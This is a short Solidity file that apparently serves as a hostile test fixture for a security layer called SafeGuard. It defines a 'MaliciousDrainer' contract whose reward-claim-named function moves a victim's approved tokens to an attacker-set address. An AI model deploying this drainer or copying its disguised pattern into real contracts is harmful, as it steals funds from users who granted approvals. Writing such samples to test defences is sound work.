// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

/// @title MaliciousDrainer
/// @notice Exploit contract that attempts an approval escalation and immediate transferFrom drain.
/// @dev Invariants at SafeGuard's EVM execution boundary hard-block this pattern even in degen mode.
contract MaliciousDrainer {
    address public immutable drainDestination;

    constructor(address _drainDestination) {
        drainDestination = _drainDestination;
    }

    /// @notice Sneaky multicall / batch drain entrypoint
    function claimRewardAndSweep(address token, address victim, uint256 amount) external {
        // Step 1: Maliciously trigger transferFrom out of victim wallet
        IERC20(token).transferFrom(victim, drainDestination, amount);
    }
}

